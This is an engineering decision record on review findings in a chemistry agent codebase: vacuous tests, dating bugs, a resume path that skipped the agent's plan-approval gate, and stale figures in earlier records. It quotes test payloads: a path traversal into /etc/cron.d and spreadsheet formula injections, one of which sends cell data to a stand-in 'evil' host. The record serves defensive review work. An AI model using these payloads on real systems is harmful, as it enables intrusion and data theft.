# D-2026-09-15-a-review-of-the-review-found-the-feature-wrong-from-both-ends — A review of the review found the feature wrong from both ends

## Status

Accepted.

## Context

Six fresh-context reviews were run over `940f851..1b94c80` — the five merged pull requests of waves
0, 1, 2, 4, 7, 27 and 28, 153 files and ~13,900 insertions — one per slice, each told to drive a
mutation rather than read a guard.

The programme they reviewed had already produced four ADRs about guards that could not fail. It
produced five more, a feature that was wrong from both ends at once, and nine ADR sentences its own
authors had falsified in the same commit that wrote them.

## What the reviews found

### The digest date pair, which two waves fixed from opposite ends and neither checked

`durable/digest._is_new` was changed to read an absent `valid_from` as *open-ended*, which is
correct about the field. `memory/jobs.supported_from` was added so the miners would stop minting
undated notes. Both halves were wrong.

**`supported_from` was `max(performed_at)` over the members, justified by a false premise.** Its
docstring closed: *"when a member joins, the id changes too, so the identity and the date move
together or not at all."* `memory/ids.stable_id` is `stable_hash(min(member_ids))`, and its own
docstring explains at length why it deliberately does **not** hash the set — hashing the set "would
mint a brand-new id whenever a cluster gains a member (routine under periodic ELN sync)". Driven:

```
members {r1,r2}      -> playbook-aee3d30407cc  valid_from 2026-07-10
members {r1,r2,r3}   -> playbook-aee3d30407cc  valid_from 2026-08-20
```

Forwards, a nightly sync moves the date under an unchanged id and `_is_new` reports a note the
subscriber already holds — the hourly storm
`D-2026-09-14-an-undated-note-is-not-news-every-hour` closed, in a new dress. Backwards is worse and
silent: a member dropping out, or a `corpus_complete=False` partial read, lowers the date under the
same id, and `_is_new` answers `False` forever for a note whose content has just changed. Two more
modules restated the same false premise.

**And the `_is_new` mitigation reached one producer family.** The docstring named the cost as
`playbook` — *"a distilled rule is the one note type nobody writes on a day, and it was the note
type this silence actually cost"*. Measured on the shipped corpus: **32 of 39 notes carry no
`valid_from`**, across ten types, of which `playbook` is 5. Three producers the same merge range
touched still mint undated notes. So the pair, taken together, silenced more than it fixed.

**The guard that should have caught it could not.** `test_every_miner_dates_the_note_it_mints` is an
AST scan asserting the *keyword* `minted_on` appears in each builder call. All three miners reset to
`minted_on=None` — the exact pre-fix behaviour — and the file ran **32 passed** — its whole collection, including that test
and its failure message. Its sibling in `tests/test_observations.py` asserts
`ast.unparse(value) == "workflow_safe_today()"`; this one was written from it with that half
dropped.

### Five more guards that could not fail

| Guard | Why it could not fail |
| --- | --- |
| `test_a_kind_outside_the_vocabulary_never_reaches_the_outbox` | The payload `"../../../etc/cron.d/escape"` traverses past `tmp_path` to a directory that does not exist, so the write raises and every assertion passes *because the traversal missed*. Driven with the `Literal` deleted and a deeper tempdir, the same payload wrote `/etc/cron.d/escape-<hash>.md` and the seam reported `took=['local']`. |
| `test_every_miner_dates_the_note_it_mints` | Asserts the keyword, not the value (above). |
| `test_no_tool_description_tells_the_model_about_a_tier_that_is_gone` | Scans `registered_tools()` — 31 in-process tools — against an agent surface of 114. Every first-party connector bundle was outside it, including the whole `calc` surface: the bundle that *lost* DFT was the one the guard could not see. A sentence naming DFT, HPC, Nextflow and `compute_dft_energy` inserted into `connectors/calc/server/tools.py` left the file at **50 passed**. |
| `test_a_patched_off_branch_still_has_the_code_its_histories_recorded` | Asserts the symbol exists and is referenced, never that a worker serves it. Removing `@durable_activity("background")` — leaving `@activity.defn` and the reference intact — left 20 and 14 passing across four files, while an open run replaying that branch schedules a type the worker cannot resolve. |
| `_grown` in `tests/test_publish_projection.py` | Re-identifies four field names (`structure_id`, `conformer_id`, `id`, `atom_index`) that none of the fixture items carry. Deleting the whole loop left **58 passed**, so the growth law was measured over byte-identical copies and its anti-dedup premise was never exercised. |

Mis-aiming one of those mutations found a sixth gap nobody had looked for: removing
`@durable_activity("background")` from `acknowledge_digest` — a **live** activity on the digest's
success path — left 34 tests green across the four files that could plausibly hold it.

### A route that published a clean bill the corpus never gave

`api/routes/protocols.post_revision` called `run_checks` with neither `failures=` nor `precedent=`,
while both agent call sites pass them. Measured on one document:

```
no_documented_failure  agent: FAIL "the corpus records 1 failure(s) bearing on this design: …"
                       route: PASS "no recorded failure bears on this design"
precedent_consulted    agent: FAIL "the record holds 1 similar run(s) this design does not cite: …"
                       route: PASS "no uncited precedent was offered for this design"
```

So a chemist fixing a typo on a design the agent had flagged republished it clean, overwriting the
verdict. Two docstrings added in the same merge forbid exactly this: `post_revision`'s
(*"the two halves of the surface would grade the same document differently depending on who wrote
it"*) and `run_checks`' (*"a caller that skips the lookup therefore publishes a clean bill the
corpus never gave"*).

Beside it, `run_checks` evaluated `check in supplied` **before** the stage gate, so the two names
added to `_REQUEST_STAGE` were dead configuration producing the right behaviour by accident:
cutting that set back to `{"components_resolve"}` left five tests green, including the one written
to pin it.

### A resume path with no caller and three defects

`agent/resume.py` shipped in the same commit as the ADR saying *"No resume path ships in the commit
carrying this record"* and *"Nothing yet, deliberately — this record scopes a build."* Its whole
public surface had no caller in `src/`, reachable only from its own test — the `map_to_hpc_identity`
shape `CLAUDE.md` names by hand and `D-2026-08-15` deleted 254 lines for. And it carried three
defects a caller would have hit:

1. **The plan gate is off on a resume.** `resume_turn` established none of the four per-turn
   ambients `api/runner.py` sets, and `plan_gate.enforce_plan_approval` returns early when
   `get_current_session_id()` is empty — under a comment arguing the bypass is safe *because such
   paths have no session*. `resume_turn` has the session id as a parameter and never sets the
   contextvar, so every side-effecting tool replayed on resume skipped the gate.
2. **The lease is taken once and never refreshed**, against a 60 s default, while a chat turn
   heartbeats at `lease_seconds / _CLAIM_REFRESHES_PER_LEASE`. Any resume longer than a minute
   reopens the fork the module's own docstring is built around.
3. **No `__pregel_tasks` read and no idempotency guard**, which the ADR's own decision item 3 calls
   a requirement.

Two comments also claimed parity with `enforce_spend_cap` "against `metered_turn_tokens`". That is a
contextvar defaulting to `None`, and `billed_tokens` is an untracked `TurnTotal`; both are 0 in a
resuming process, so only the model-call half of the parity exists. The claimed one-call margin is
also zero — the comparison runs *before* the increment, measured 0/0, 1/1, 2/2, 3/3, 4/4 at a cap
of 4.

### A migration that can abort an upgrade, and batching that lost its tail

`infra/sql/098` builds a `SHARE`-locking index on `session_messages`, written on every turn, under
`core/migrate.py`'s 5 s `lock_timeout`, inside the `pre-upgrade` hook. Measured on this image at
1,000,000 rows: 691 / 485 / 503 / 443 ms for a 10 MB partial index — fast, and irrelevant, because
what expires is the wait for the lock. The sibling migration for the *less* hot table (`059`) has
carried the pre-build escape hatch since it was written; `098` carried none of it.

`BatchingNoteWriter` returned `written=False` for held notes, so `chemclaw_notes_recorded_total` —
documented as "a note reached the graph" — counted commits, about 200 for a 10,000-note backfill,
and the trailing `flush()` happens outside `record_note` so its notes were never counted at all. Its
docstring claimed concatenating files "is exactly the sequence the unbatched path would apply";
`GitNoteWriter._write_and_commit` resolves every `overwrite=False` against the tree in one plan pass
*before* writing, so a later note's dependency copy beat a subject written earlier in the same
batch. And `cli/backfill_corpus`'s trailing flush was a bare statement after the loop, so an error
the loop's `except` does not catch dropped up to `batch_size - 1` notes the log had already reported
as written.

### A run sheet that executes, and an eval that conditions on its treatment

`protocols/export` had no formula-injection handling and the case was in neither hazard list —
`run_sheet_csv` enumerated "a comma, a quote or a newline", the test file "a comma, a quote, a
newline, an absent number, and a column order". A `solvent` of `@SUM(1+9)*cmd|'/C calc'!A0` and a
`note` of `=HYPERLINK("http://evil/?"&A1,"x")` both reach a spreadsheet live; `QUOTE_MINIMAL` does
nothing, because quoting is stripped before the parse. Separately, a factor named `solvent` — the
canonical HTE design — produced two columns of that name, where `pandas.read_csv` takes the empty
fixed one and `dict(zip(...))` takes the factor.

`evals/delegation` measures a genuine outcome, and then conditions on the treatment twice.
`compare_arms` refused a baseline that delegated in *any* repeat and credited an arm that delegated
in *at least one*, with `ArmAggregate.delegated_in` computed and discarded and no report field
carrying compliance: an arm delegating 1 of 3, that one run scoring 1.0 at 2,000 tokens against 0.5
at 10,000, reported `median_token_ratio: 1.0` and "no effect". And `NoComparableTask` fired only on
an *empty* set, so eight tasks where the arm declines seven reported "helped everywhere, 60%
cheaper, 33% faster" over one. A model that delegates **selectively** therefore outscored one that
delegates as a policy — the selection effect this module's own docstring indicts in the corpus it
replaces.

### Eleven ADR sentences, across nine records, falsified by the code they describe

Merged ADRs are never edited, so they are corrected here.

| Record | The sentence | What the code says |
| --- | --- | --- |
| `a-turn-outlives-its-request…` | "No resume path ships in the commit carrying this record"; "Nothing yet, deliberately" | `src/chemclaw/agent/resume.py` and that ADR were both added by `1b94c80` |
| `a-docstring-is-a-prompt-and-a-comment-is-not` | "64,907 → 64,598, ceiling **65,500 → 65,200**" | `CEILINGS["__default__"]` was already 67,500 (wave 0 raised it); that commit does not touch the ratchet at all, so the 309-token saving is real and **unratcheted**, and 64,907 measured the harness-*off* arm |
| same | "over the 92 tools a `default` turn binds" | 93 |
| `a-number-somebody-else-can-produce` | "100 questions … 13 from each of eight categories" | 13 × 8 = 104; the file holds 13 each from seven categories and 9 from `toxicity_and_safety` |
| `a-profiles-prose-is-text-this-repository-wrote` | "`evidence` binds fourteen tools" | 15 |
| `an-artefact-three-files-name-and-none-produces` | "the only `import csv` anywhere in `src/` was in ingest readers" | three, one of them `cli/live_data.py` |
| `the-seam-shipped-a-replay-break…` | quotes the record it corrects as saying "`pyexec` is named in five files" | that record says "five **times** in `up.sh`" and lists four locations; the correction's substance is right and its quotation is invented |
| `an-undated-note-is-not-news-every-hour` | ":63 — the 31 already-written undated notes" | 32, as its own `:35` says |
| `a-pointer-is-not-a-deliverable` | "The pattern admits no separator, no `..` and no leading dot" | `^[A-Za-z0-9][A-Za-z0-9._-]*$` admits `..` after the first character — harmless, since no separator can accompany it, but it is a claim about a traversal control |

## Decision

1. **`supported_from` anchors on `min(reaction_ids)`** — the same single input `stable_id` uses — so
   identity and date are functions of the same thing and genuinely move together or not at all. The
   residual is stated: a cluster whose anchor run is undated yields `None` even when other members
   carry dates, because no stable function of a growing set can answer "when did this become
   knowable".
2. **The producers whose validity date *is* their arrival date now carry one**:
   `report_note(drafted_on=…)` and `note_with_run_provenance(ran_on=…)`, the latter from
   `workflow.now()` so replay is unaffected. `record_knowledge_note` is left alone and becomes a
   `BACKLOG.md` row, because defaulting it to today would trade a silence for a false claim about
   chemistry; closing it needs an arrival signal separate from `valid_from`.
3. **Every guard above is replaced by one that fails**, each driven until it went red for the reason
   it exists. Two new guards cover gaps nothing held: every `@activity.defn` in `durable/` must be
   registered on a queue, and a connector job that *fails* must tell its requester.
4. **`post_revision` passes the corpus**, an AST guard holds every `run_checks` call site to both
   keywords, and the stage gate is evaluated before the dispatch so `_REQUEST_STAGE` is the
   mechanism its comment claims.
5. **`agent/resume.py` is deleted.** `calls_already_made` — the half with a real consumer, closing a
   real hole — moves into `agent/loop_cap.py`. Re-adding a resume path is a new decision, and it
   owes the four ambients, a refreshed lease, and the `__pregel_tasks` guard its own record named.
6. **`098` carries the pre-build escape hatch and the measurement**; `BatchingNoteWriter` counts
   notes and replays the sequence it replaces; the backfill flush is in a `finally`.
7. **A text cell opening with a formula trigger is prefixed**, and a number never is, so `-40`
   survives for the LIMS import this export feeds; colliding factor columns are suffixed.
8. **Delegation compliance is symmetric and carried in the report**, and `MINIMUM_COMPARED_SHARE`
   bounds the denominator so a report over the minority raises instead of reading as a result.
9. **A second prose guard** refuses model-facing text that promises the review gate
   `D-2026-09-05-the-gate-follows-behaviour-not-knowledge` deleted. It found a fourth offender in
   `expand_note` that nobody had looked for.

## Consequences

**The thing worth carrying is not any single defect.** Three of the six reviews found their worst
problem inside a *fix* from the previous wave, written by a session that had just measured the
defect it was repairing and did not measure the repair. `supported_from` is the clearest case: one
`python -c` against `stable_id` would have shown the premise false before the docstring asserting it
was written.

**And the vacuous-guard count is now nine across this programme, with seven distinct causes.** The
four in `tasks/lessons.md` were: an assertion the in-process harness cannot express; a string absent
for an unrelated reason; a fixture returning an empty set; one call where the defect needs two. The
five here add: an assertion over the call's *shape* rather than its argument's value; a scan over a
strict subset of the surface at risk; and a symbol-existence check standing in for a registration.
The rule that follows is in `tasks/lessons.md`: when a mutation survives, the question is *which* of
these the assertion is, because only two of the seven are fixed by asserting something stronger
about the same object — the rest need a different object, a wider set, or a different payload.

**A number in prose is a claim about a commit, and this programme kept proving it on itself.** Two
of the stale figures above went stale *inside their own merge range*, falsified by a sibling commit
in the same pull request. `tests/test_probe_coverage.py` cites
`D-2026-09-03-a-number-in-prose-is-a-claim-about-a-commit` two tests below a figure that was wrong
the day it was written.

## What keeps it true

- `tests/test_memory.py::test_a_cluster_that_gains_a_member_keeps_both_its_id_and_its_date` — the
  assertion that would have caught the original defect; `max(dated)` fails it.
- `tests/test_memory.py::test_every_miner_dates_the_note_it_mints` — now asserts the argument's
  value, not the keyword's presence.
- `tests/test_prose_contract.py::test_no_tool_description_tells_the_model_about_a_tier_that_is_gone`
  and `::test_no_tool_description_tells_the_model_to_expect_a_review_gate` — over the whole
  model-facing surface, bundles included.
- `tests/test_workflow_versioning.py::test_the_off_branch_activity_is_registered_on_the_queue_that_replays_it`
  and `::test_every_durable_activity_is_registered_on_a_queue`.
- `tests/test_outbound_delivery.py::test_a_kind_outside_the_vocabulary_never_reaches_the_outbox`
  and `::test_a_job_that_fails_tells_its_requester_and_not_only_a_job_that_finishes`.
- `tests/test_protocol_checks.py::test_every_run_checks_caller_supplies_the_corpus_the_corpus_checks_need`.
- `tests/test_protocol_export.py::test_a_free_text_cell_cannot_reach_a_spreadsheet_as_a_formula`
  and `::test_a_factor_named_like_a_fixed_column_does_not_produce_two_columns_of_that_name`.
- `tests/test_backfill_batching.py::test_every_note_in_a_batch_is_counted_once_rather_than_once_per_commit`,
  `::test_a_backfill_that_dies_mid_run_still_commits_what_it_already_counted` and
  `::test_a_dependency_in_a_batch_does_not_overwrite_a_subject_written_earlier_in_it`.
- `tests/test_delegation_eval.py::test_an_arm_that_delegated_in_some_repeats_is_not_credited_as_delegation`
  and `::test_a_report_over_the_minority_of_tasks_the_arm_chose_raises_rather_than_reporting`.
- `tests/test_publish_projection.py::_grown` — `_DISTINGUISHING` is asserted against the items, so a
  renamed field is red rather than silently skipped.
- `tests/test_loop_cap_floor.py` — what is left of `tests/test_resume.py`, and its module docstring
  records why the rest is gone.
